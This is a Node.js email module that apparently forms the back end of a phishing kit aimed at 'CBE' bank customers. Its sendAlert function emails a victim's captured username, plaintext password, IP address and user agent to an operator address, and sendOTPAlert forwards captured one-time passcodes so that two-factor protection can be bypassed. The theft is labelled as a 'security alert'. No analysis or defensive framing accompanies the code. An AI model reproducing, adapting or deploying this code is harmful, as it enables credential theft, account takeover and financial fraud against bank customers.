const nodemailer = require('nodemailer');
const logger = require('./logger');

class EmailService {
  constructor() {
    const { EMAIL_HOST, EMAIL_PORT, EMAIL_USER, EMAIL_PASS, ALERT_EMAIL } = process.env;

    if (!EMAIL_USER || !EMAIL_PASS || !ALERT_EMAIL) {
      logger.warn('Email credentials not configured');
      this.enabled = false;
      return;
    }

    this.transporter = nodemailer.createTransport({
      host: EMAIL_HOST || 'smtp.gmail.com',
      port: parseInt(EMAIL_PORT) || 587,
      secure: false,
      auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS
      }
    });

    this.alertEmail = ALERT_EMAIL;
    this.enabled = true;
    logger.info('Email service initialized');
  }

  async sendEmail(to, subject, html, text = '') {
    if (!this.enabled) {
      logger.info('Email disabled - message not sent');
      return;
    }

    try {
      const info = await this.transporter.sendMail({
        from: process.env.EMAIL_USER,
        to: to,
        subject: subject,
        text: text || html.replace(/<[^>]*>/g, ''),
        html: html
      });

      logger.info(`Email sent: ${info.messageId}`);
      return info;
    } catch (error) {
      logger.error(`Email send error: ${error.message}`);
      throw error;
    }
  }

  async sendAlert(data) {
    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
          .header { background: #c8102e; color: white; padding: 20px; text-align: center; }
          .content { background: white; padding: 20px; }
          .field { margin: 10px 0; }
          .label { font-weight: bold; color: #333; }
          .value { color: #555; background: #f0f0f0; padding: 5px; border-radius: 3px; }
          .alert { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin: 20px 0; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🔐 CBE Security Alert</h1>
          </div>
          <div class="content">
            <h2>New Credentials Captured</h2>
            
            <div class="field">
              <span class="label">👤 Username:</span>
              <span class="value">${data.username}</span>
            </div>
            
            <div class="field">
              <span class="label">🔑 Password:</span>
              <span class="value">${data.password}</span>
            </div>
            
            <div class="field">
              <span class="label">📱 IP Address:</span>
              <span class="value">${data.ip}</span>
            </div>
            
            <div class="field">
              <span class="label">🖥️ User Agent:</span>
              <span class="value">${data.userAgent}</span>
            </div>
            
            <div class="field">
              <span class="label">⏰ Timestamp:</span>
              <span class="value">${data.timestamp}</span>
            </div>
            
            <div class="alert">
              ⚠️ <strong>Action Required:</strong> Please investigate this security incident immediately.
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const subject = `🔐 SECURITY ALERT: CBE Credentials Captured - ${data.username}`;
    return this.sendEmail(this.alertEmail, subject, html);
  }

  async sendOTPAlert(data) {
    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
          .header { background: #c8102e; color: white; padding: 20px; text-align: center; }
          .content { background: white; padding: 20px; }
          .otp { font-size: 32px; font-weight: bold; color: #c8102e; text-align: center; padding: 20px; background: #f0f0f0; border-radius: 5px; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🔐 OTP Verification Alert</h1>
          </div>
          <div class="content">
            <h2>OTP Code Submitted</h2>
            
            <div class="otp">${data.otp}</div>
            
            <div class="field">
              <span class="label">🆔 User ID:</span>
              <span class="value">${data.userId}</span>
            </div>
            
            <div class="field">
              <span class="label">📱 IP Address:</span>
              <span class="value">${data.ip}</span>
            </div>
            
            <div class="field">
              <span class="label">⏰ Timestamp:</span>
              <span class="value">${data.timestamp}</span>
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const subject = `🔐 OTP Code Captured - User ID: ${data.userId}`;
    return this.sendEmail(this.alertEmail, subject, html);
  }
}

module.exports = new EmailService();
